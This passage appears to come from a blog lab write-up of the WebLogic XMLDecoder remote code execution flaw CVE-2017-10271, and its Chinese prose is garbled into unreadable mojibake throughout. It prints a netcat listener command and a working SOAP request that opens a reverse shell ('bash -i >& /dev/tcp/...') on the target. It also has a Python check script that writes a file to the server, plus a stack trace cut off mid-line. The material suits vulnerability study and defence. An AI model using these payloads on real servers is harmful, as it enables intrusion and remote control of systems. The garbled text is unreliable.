src="/2024/10/22/WebSecurity/cve/CVE-2017-10271/image-1.png"><br>ä¹‹åå°†dockerä¸­çš„é¡¹ç›®æ–‡ä»¶cpå‡ºæ¥ï¼Œæ·»åŠ åœ¨IDEAé¡¹ç›®ä¸­ï¼Œåœ¨debugé…ç½®ä¸­æ·»åŠ è¿œç¨‹è°ƒè¯•</p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>ä½¿ç”¨äº†ç½‘ä¸Šexpï¼ŒæˆåŠŸgetshellï¼Œé¦–å…ˆåœ¨ä¸»æœºç›‘å¬ï¼š<code>nc -l -p 9999</code>ï¼Œä¹‹åä½¿ç”¨burpä¿®æ”¹ä¸‹é¢çš„æ•°æ®åŒ…</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/wls-wsat/CoordinatorPortType</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:7001</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/xml</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>639</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.4.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                    <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                                /bin/bash</span></span><br><span class="line"><span class="language-xml">                            <span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                                -c</span></span><br><span class="line"><span class="language-xml">                            <span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                                bash -i &gt;&amp; /dev/tcp/192.168.0.32/9999 0&gt;&amp;1</span></span><br><span class="line"><span class="language-xml">                            <span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                    <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>æˆåŠŸåå¼¹shell<br><img src="/2024/10/22/WebSecurity/cve/CVE-2017-10271/image-2.png" alt="å…¶ä¸­ ns2:frame æ ‡ç­¾ä¸­æ‰“å°å‡ºçš„æ˜¯è°ƒç”¨æ ˆä¿¡æ¯"></p><p>Payloadè§£æ<br>SOAP è¯·æ±‚ç»“æ„</p><ul><li><strong>Envelope</strong>: å®šä¹‰äº† SOAP æ¶ˆæ¯çš„å¤–å±‚ç»“æ„ï¼Œä½¿ç”¨çš„æ˜¯æ ‡å‡†çš„ SOAP Envelope å‘½åç©ºé—´ã€‚</li><li><strong>Header</strong>: SOAP æ¶ˆæ¯ä¸­ç”¨æ¥åŒ…å«å¤´éƒ¨ä¿¡æ¯ï¼Œè¿™é‡Œç‰¹åˆ«ä½¿ç”¨äº† <code>WorkContext</code>ï¼Œè¿™æ˜¯ WebLogic Server ç‰¹æœ‰çš„æœºåˆ¶ï¼Œç”¨äºåœ¨ SOAP è¯·æ±‚ä¸­ä¼ é€’ä¸Šä¸‹æ–‡æˆ–çŠ¶æ€ä¿¡æ¯ã€‚</li></ul><p>WorkContext å†…å®¹</p><ul><li><strong>XMLDecoder</strong>: åˆ©ç”¨ Java çš„ <code>java.beans.XMLDecoder</code> ç±»æ¥ååºåˆ—åŒ– XML ä¸­å®šä¹‰çš„ Java å¯¹è±¡ã€‚ç”±äº XMLDecoder å¯ä»¥å®ä¾‹åŒ–ä»»ä½• Java å¯¹è±¡ï¼Œå› æ­¤å®ƒè¢«ç”¨äºæ‰§è¡Œæ¶æ„ä»£ç ã€‚</li></ul><p>æ¶æ„ä»£ç æ‰§è¡Œæµç¨‹</p><ol><li><strong>ProcessBuilder</strong>: ä½¿ç”¨ <code>java.lang.ProcessBuilder</code>ï¼Œè¿™æ˜¯ Java ä¸­ç”¨äºåˆ›å»ºæ“ä½œç³»ç»Ÿè¿›ç¨‹çš„ APIã€‚</li><li><strong>æ•°ç»„æ„é€ </strong>: æ„é€ ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ï¼Œç”¨äºä½œä¸º <code>ProcessBuilder</code> çš„å‚æ•°ã€‚è¿™ä¸ªæ•°ç»„åŒ…å«äº†è¦æ‰§è¡Œçš„å‘½ä»¤ï¼š<ul><li><code>/bin/bash</code>: ä½¿ç”¨ bash shellã€‚</li><li><code>-c</code>: è¡¨ç¤ºåé¢çš„å­—ç¬¦ä¸²æ˜¯è¦è¿è¡Œçš„å‘½ä»¤ã€‚</li><li><code>bash -i &gt;&amp; /dev/tcp/192.168.0.32/9999 0&gt;&amp;1</code>: è¿™æ¡å‘½ä»¤å°è¯•å»ºç«‹ä¸€ä¸ªåå‘ shell è¿æ¥åˆ° IP åœ°å€ä¸º 192.168.0.32 ç«¯å£ 9999 çš„æœåŠ¡å™¨ã€‚è¿™ä¸ªå‘½ä»¤çš„åŠŸèƒ½æ˜¯å°†å½“å‰ shell çš„è¾“å…¥è¾“å‡ºé‡å®šå‘åˆ°ä¸€ä¸ª TCP è¿æ¥ï¼Œå®é™…ä¸Šæ˜¯åˆ›å»ºäº†ä¸€ä¸ªå¯ä»¥è¿œç¨‹æ§åˆ¶çš„ shellã€‚</li></ul></li><li><code>&lt;void method=&quot;start&quot;/&gt;</code> - è¿™è¡Œä»£ç è°ƒç”¨ <code>ProcessBuilder</code> çš„ <code>start()</code> æ–¹æ³•ï¼Œå¯åŠ¨æ„å»ºçš„è¿›ç¨‹ï¼Œå®é™…ä¸Šå°±æ˜¯æ‰§è¡Œäº†ä¸Šè¿°çš„ bash å‘½ä»¤ã€‚</li></ol><p>ä¸‹é¢æ˜¯ä¸€ä¸ªæ¼æ´éªŒè¯è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/xml&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Webogic_XMLDecoder_poc</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="comment">#url=&quot;http://192.168.189.137:7001&quot;</span></span><br><span class="line">    posturl=url+<span class="string">&#x27;/wls-wsat/CoordinatorPortType&#x27;</span></span><br><span class="line">    data = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;soapenv:Header&gt;</span></span><br><span class="line"><span class="string">            &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;java version=&quot;1.6.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;object class=&quot;java.io.PrintWriter&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;string&gt;servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/test.txt&lt;/string&gt;&lt;void method=&quot;println&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;string&gt;xmldecoder_vul_test&lt;/string&gt;&lt;/void&gt;&lt;void method=&quot;close&quot;/&gt;</span></span><br><span class="line"><span class="string">                    &lt;/object&gt;</span></span><br><span class="line"><span class="string">                &lt;/java&gt;</span></span><br><span class="line"><span class="string">            &lt;/work:WorkContext&gt;</span></span><br><span class="line"><span class="string">        &lt;/soapenv:Header&gt;</span></span><br><span class="line"><span class="string">        &lt;soapenv:Body/&gt;</span></span><br><span class="line"><span class="string">    &lt;/soapenv:Envelope&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">     </span><br><span class="line">    <span class="built_in">print</span> (url)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r=requests.post(posturl,data=data,headers=headers,timeout=<span class="number">5</span>)</span><br><span class="line">        geturl=url+<span class="string">&quot;/wls-wsat/test.txt&quot;</span></span><br><span class="line">        <span class="built_in">print</span> (geturl)</span><br><span class="line">        check_result = requests.get(geturl,headers=headers,timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;xmldecoder_vul_test&#x27;</span> <span class="keyword">in</span> check_result.text:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;[+]å­˜åœ¨WebLogic WLSè¿œç¨‹æ‰§è¡Œæ¼æ´(CVE-2017-10271)&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;[-]ä¸å­˜åœ¨WebLogic WLSè¿œç¨‹æ‰§è¡Œæ¼æ´(CVE-2017-10271)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&quot;http://192.168.189.137:7001&quot;</span></span><br><span class="line">    Webogic_XMLDecoder_poc(url)</span><br></pre></td></tr></table></figure><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>è¿™é‡Œé¦–å…ˆå°†ä¸Šé¢çš„è°ƒç”¨æ ˆä¿¡æ¯æ ¼å¼åŒ–ä¸€ä¸‹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">S:Envelope</span> <span class="attr">xmlns:S</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">S:Body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">S:Fault</span> <span class="attr">xmlns:ns4</span>=<span class="string">&quot;http://www.w3.org/2003/05/soap-envelope&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">faultcode</span>&gt;</span></span><br><span class="line">                S:Server</span><br><span class="line">            <span class="tag">&lt;/<span class="name">faultcode</span>&gt;</span>            <span class="tag">&lt;<span class="name">faultstring</span>&gt;</span></span><br><span class="line">                0</span><br><span class="line">            <span class="tag">&lt;/<span class="name">faultstring</span>&gt;</span>            <span class="tag">&lt;<span class="name">detail</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">ns2:exception</span> <span class="attr">xmlns:ns2</span>=<span class="string">&quot;http://jax-ws.dev.java.net/&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ArrayIndexOutOfBoundsException&quot;</span> <span class="attr">note</span>=<span class="string">&quot;To disable this feature, set com.sun.xml.ws.fault.SOAPFaultBuilder.disableCaptureStackTrace system property to false&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">message</span>&gt;</span></span><br><span class="line">                        0</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">message</span>&gt;</span>                    <span class="tag">&lt;<span class="name">ns2:stackTrace</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.beans.ObjectHandler&quot;</span> <span class="attr">file</span>=<span class="string">&quot;ObjectHandler.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;139&quot;</span> <span class="attr">method</span>=<span class="string">&quot;dequeueResult&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span> <span class="attr">file</span>=<span class="string">&quot;XMLDecoder.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;206&quot;</span> <span class="attr">method</span>=<span class="string">&quot;readObject&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.wsee.workarea.WorkContextXmlInputAdapter&quot;</span> <span class="attr">file</span>=<span class="string">&quot;WorkContextXmlInputAdapter.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;111&quot;</span> <span class="attr">method</span>=<span class="string">&quot;readUTF&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.workarea.spi.WorkContextEntryImpl&quot;</span> <span class="attr">file</span>=<span class="string">&quot;WorkContextEntryImpl.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;92&quot;</span> <span class="attr">method</span>=<span class="string">&quot;readEntry&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.workarea.WorkContextLocalMap&quot;</span> <span class="attr">file</span>=<span class="string">&quot;WorkContextLocalMap.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;179&quot;</span> <span class="attr">method</span>=<span class="string">&quot;receiveRequest&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.workarea.WorkContextMapImpl&quot;</span> <span class="attr">file</span>=<span class="string">&quot;WorkContextMapImpl.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;163&quot;</span> <span class="attr">method</span>=<span class="string">&quot;receiveRequest&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.wsee.jaxws.workcontext.WorkContextServerTube&quot;</span> <span class="attr">file</span>=<span class="string">&quot;WorkContextServerTube.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;71&quot;</span> <span class="attr">method</span>=<span class="string">&quot;receive&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.wsee.jaxws.workcontext.WorkContextTube&quot;</span> <span class="attr">file</span>=<span class="string">&quot;WorkContextTube.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;107&quot;</span> <span class="attr">method</span>=<span class="string">&quot;readHeaderOld&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.wsee.jaxws.workcontext.WorkContextServerTube&quot;</span> <span class="attr">file</span>=<span class="string">&quot;WorkContextServerTube.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;43&quot;</span> <span class="attr">method</span>=<span class="string">&quot;processRequest&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.ws.api.pipe.Fiber&quot;</span> <span class="attr">file</span>=<span class="string">&quot;Fiber.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;866&quot;</span> <span class="attr">method</span>=<span class="string">&quot;__doRun&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.ws.api.pipe.Fiber&quot;</span> <span class="attr">file</span>=<span class="string">&quot;Fiber.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;815&quot;</span> <span class="attr">method</span>=<span class="string">&quot;_doRun&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.ws.api.pipe.Fiber&quot;</span> <span class="attr">file</span>=<span class="string">&quot;Fiber.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;778&quot;</span> <span class="attr">method</span>=<span class="string">&quot;doRun&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.ws.api.pipe.Fiber&quot;</span> <span class="attr">file</span>=<span class="string">&quot;Fiber.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;680&quot;</span> <span class="attr">method</span>=<span class="string">&quot;runSync&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.ws.server.WSEndpointImpl$2&quot;</span> <span class="attr">file</span>=<span class="string">&quot;WSEndpointImpl.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;403&quot;</span> <span class="attr">method</span>=<span class="string">&quot;process&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.ws.transport.http.HttpAdapter$HttpToolkit&quot;</span> <span class="attr">file</span>=<span class="string">&quot;HttpAdapter.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;539&quot;</span> <span class="attr">method</span>=<span class="string">&quot;handle&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.ws.transport.http.HttpAdapter&quot;</span> <span class="attr">file</span>=<span class="string">&quot;HttpAdapter.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;253&quot;</span> <span class="attr">method</span>=<span class="string">&quot;handle&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.ws.transport.http.servlet.ServletAdapter&quot;</span> <span class="attr">file</span>=<span class="string">&quot;ServletAdapter.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;140&quot;</span> <span class="attr">method</span>=<span class="string">&quot;handle&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.wsee.jaxws.WLSServletAdapter&quot;</span> <span class="attr">file</span>=<span class="string">&quot;WLSServletAdapter.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;171&quot;</span> <span class="attr">method</span>=<span class="string">&quot;handle&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.wsee.jaxws.HttpServletAdapter$AuthorizedInvoke&quot;</span> <span class="attr">file</span>=<span class="string">&quot;HttpServletAdapter.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;708&quot;</span> <span class="attr">method</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.security.acl.internal.AuthenticatedSubject&quot;</span> <span class="attr">file</span>=<span class="string">&quot;AuthenticatedSubject.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;363&quot;</span> <span class="attr">method</span>=<span class="string">&quot;doAs&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.security.service.SecurityManager&quot;</span> <span class="attr">file</span>=<span class="string">&quot;SecurityManager.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;146&quot;</span> <span class="attr">method</span>=<span class="string">&quot;runAs&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.wsee.util.ServerSecurityHelper&quot;</span> <span class="attr">file</span>=<span class="string">&quot;ServerSecurityHelper.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;103&quot;</span> <span class="attr">method</span>=<span class="string">&quot;authenticatedInvoke&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.wsee.jaxws.HttpServletAdapter$3&quot;</span> <span class="attr">file</span>=<span class="string">&quot;HttpServletAdapter.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;311&quot;</span> <span class="attr">method</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.wsee.jaxws.HttpServletAdapter&quot;</span> <span class="attr">file</span>=<span class="string">&quot;HttpServletAdapter.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;336&quot;</span> <span 